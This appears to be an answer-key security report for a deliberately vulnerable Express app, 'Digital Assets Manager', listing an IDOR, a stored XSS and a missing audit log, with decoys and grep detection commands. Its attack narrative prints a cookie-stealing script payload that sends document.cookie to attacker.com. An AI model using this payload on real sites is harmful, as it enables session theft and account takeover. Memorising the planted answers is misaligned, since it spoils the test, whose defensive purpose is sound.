# Security Report: app-15-digital-assets

## Application Information

- **App ID**: app-15
- **App Name**: Digital Assets Manager
- **Language**: TypeScript
- **Framework**: Express
- **Source**: `apps/typescript/app-15-digital-assets/`

---

## Vulnerability Summary

| ID | OWASP | Category | Severity | Location | CWE |
|---|---|---|---|---|---|
| V1 | A01 | Broken Access Control | Medium | `src/index.ts` → `GET /api/portfolios/:id` (lines 156-170) | CWE-639 |
| V2 | A03 | Injection | High | `src/index.ts` → `GET /api/assets/search` (lines 173-185) | CWE-79 |
| V3 | A09 | Security Logging and Monitoring Failures | Low | `src/index.ts` → `POST /api/admin/portfolios/:id/delete` (lines 192-208) | CWE-778 |

### V1: IDOR on Portfolio Details

**OWASP Category**: A01 — Broken Access Control

**Description**: Viewing digital asset portfolio details by ID lacks verification of user ownership, allowing any authenticated user to retrieve details of another investor's portfolio.

**Endpoint**: `GET /api/portfolios/:id`

**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)

**Impact**: Medium — Any authenticated user can enumerate portfolio IDs to view sensitive asset holdings, valuations, and transaction history.

**Detection**: Look for absence of ownership checks where the `:id` parameter is used without verifying `req.user.id` against the portfolio's owner ID.

---

### V2: Stored XSS in Asset Search Results

**OWASP Category**: A03 — Injection

**Description**: Asset descriptions are rendered in search results without HTML encoding, enabling stored cross-site scripting.

**Endpoint**: `GET /api/assets/search`

**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Impact**: High — An attacker can inject malicious JavaScript in an asset description field. When other users search for or view that asset, the script executes in their browser, potentially stealing session tokens or performing actions on their behalf.

**Detection**: Look for asset description fields being served as raw HTML strings in API responses and rendered client-side with `innerHTML` or similar without sanitization.

---

### V3: Missing Audit Log on Portfolio Deletion

**OWASP Category**: A09 — Security Logging and Monitoring Failures

**Description**: Deleting investment portfolios from the system produces no audit logs, blindfolding administrators to record destruction.

**Endpoint**: `POST /api/admin/portfolios/:id/delete`

**CWE**: CWE-778 (Insufficient Logging)

**Impact**: Low — Malicious or accidental deletion of portfolio records cannot be traced or investigated.

**Detection**: Check the delete handler for any logging, audit trail, or notification mechanism before/after performing the deletion operation.

---

## Chained Attack Scenario

### Chain: "Stored XSS Portfolio Malware → Asset Portfolio IDOR Exfiltration"

**Impact**: `account_takeover`

**Overview**: An attacker embeds a malicious script in an asset description, which steals a portfolio manager's session when they view search results. The attacker then uses the session to exfiltrate other users' portfolio data via IDOR.

**Components**:

| Step | Issue | Severity | OWASP | CWE | Location |
|---|---|---|---|---|---|
| 1 | Stored XSS in asset descriptions enables session cookie theft | Medium | A03 | CWE-79 | `GET /api/assets/search` |
| 2 | Portfolio detail endpoint permits IDOR exfiltration of sensitive holdings | Medium | A01 | CWE-639 | `GET /api/portfolios/:id` |

**Attack Narrative**:
1. The attacker posts an asset with a description containing a malicious JavaScript payload: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`.
2. When a portfolio manager searches for assets via `GET /api/assets/search`, the XSS payload executes in their browser, exfiltrating their session cookie to the attacker.
3. Using the hijacked session, the attacker queries `GET /api/portfolios/3` through IDOR to retrieve detailed portfolio data from other investors.

**Combined Impact**: Account takeover — An attacker can steal admin sessions and exfiltrate sensitive portfolio data by chaining stored XSS with IDOR.

---

## Decoys (False-Positive Candidates)

| Location | Description |
|---|---|
| `src/index.ts` | Proper parameterized query logic in `POST /api/portfolios/create` to create new portfolios safely |
| `src/index.ts` | Proper Bcrypt hashing for password storage and validation |

---

## Detection Commands

```bash
# Find IDOR on portfolio details
grep -n "portfolios.*:id\|findOne\|findById" apps/typescript/app-15-digital-assets/src/index.ts

# Find XSS in asset search
grep -n "search\|innerHTML\|res\.send\|escape\|sanitize" apps/typescript/app-15-digital-assets/src/index.ts

# Find missing audit logs on deletion
grep -n "delete\|remove\|log\|audit" apps/typescript/app-15-digital-assets/src/index.ts
```

---

*Report generated from `.vulns` manifest for app-15-digital-assets*